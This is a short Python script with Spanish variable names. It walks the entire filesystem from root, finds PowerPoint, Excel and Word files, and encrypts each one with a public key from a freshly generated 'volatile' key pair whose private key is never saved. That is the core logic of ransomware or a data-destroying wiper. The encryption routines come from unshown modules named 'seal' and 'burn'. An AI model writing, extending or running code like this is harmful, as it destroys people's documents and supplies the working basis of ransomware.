import os
import fnmatch

extensiones = ["pptx","xlsx","docx"]
origen = "/"
def encuentra_archivos():
    archivos_encontrados = []
    for ruta_actual, directorios, archivos in os.walk(origen):
        for archivo in archivos:
            for extension in extensiones:
                if fnmatch.fnmatch(archivo, f'*.{extension}'):
                    archivos_encontrados.append(os.path.join(ruta_actual, archivo))
    return archivos_encontrados

def quick_encrypt():
    import seal
    import burn 
    priv_key,pub_key=seal.volatile_key()
    for ruta_actual, directorios, archivos in os.walk(origen):
        for archivo in archivos:
            for extension in extensiones:
                if fnmatch.fnmatch(archivo, f'*.{extension}'):
                    burn.fast_encrypt(os.path.join(ruta_actual,archivo),pub_key)
